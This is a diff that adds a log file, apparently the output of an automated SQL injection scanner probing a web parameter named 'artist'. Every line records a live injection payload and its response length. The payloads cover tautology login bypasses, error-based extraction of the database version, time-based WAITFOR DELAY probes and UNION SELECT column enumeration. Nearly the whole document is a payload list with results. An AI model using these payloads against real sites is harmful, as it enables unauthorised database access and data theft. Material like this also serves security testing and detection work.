@@ -1,0 +1,15 @@
+2025-10-05 14:43:50,124 - INFO - Possible SQLi detected on param 'artist' | Payload: ' OR '1'='1 | Resp length: 2178
+2025-10-05 14:43:52,377 - INFO - Possible SQLi detected on param 'artist' | Payload: ' OR '1'='1' --  | Resp length: 2182
+2025-10-05 14:43:54,598 - INFO - Possible SQLi detected on param 'artist' | Payload: ' OR '1'='1' /* | Resp length: 2182
+2025-10-05 14:43:57,792 - INFO - Possible SQLi detected on param 'artist' | Payload: " OR "1"="1 | Resp length: 2178
+2025-10-05 14:44:01,317 - INFO - Possible SQLi detected on param 'artist' | Payload: " OR "1"="1" --  | Resp length: 2182
+2025-10-05 14:44:03,712 - INFO - Possible SQLi detected on param 'artist' | Payload: " OR "1"="1" /* | Resp length: 2182
+2025-10-05 14:44:05,544 - INFO - Possible SQLi detected on param 'artist' | Payload: 1' OR '1'='1 | Resp length: 2184
+2025-10-05 14:44:07,838 - INFO - Possible SQLi detected on param 'artist' | Payload: 1' OR '1'='1' --  | Resp length: 2188
+2025-10-05 14:44:11,394 - INFO - Possible SQLi detected on param 'artist' | Payload: 1' OR '1'='1' /* | Resp length: 2188
+2025-10-05 14:44:13,470 - INFO - Possible SQLi detected on param 'artist' | Payload: ' AND 1=CONVERT(int, (SELECT @@version)) --  | Resp length: 2216
+2025-10-05 14:44:16,205 - INFO - Possible SQLi detected on param 'artist' | Payload: ' AND 1=CAST((SELECT @@version) AS int) --  | Resp length: 2215
+2025-10-05 14:44:19,462 - INFO - Possible SQLi detected on param 'artist' | Payload: ' WAITFOR DELAY '0:0:5'-- | Resp length: 2181
+2025-10-05 14:44:21,471 - INFO - Possible SQLi detected on param 'artist' | Payload: '; WAITFOR DELAY '0:0:5'-- | Resp length: 2181
+2025-10-05 14:44:24,465 - INFO - Possible SQLi detected on param 'artist' | Payload: ' UNION SELECT NULL,NULL-- | Resp length: 2199
+2025-10-05 14:44:26,943 - INFO - Possible SQLi detected on param 'artist' | Payload: ' UNION SELECT NULL,NULL,NULL-- | Resp length: 2204
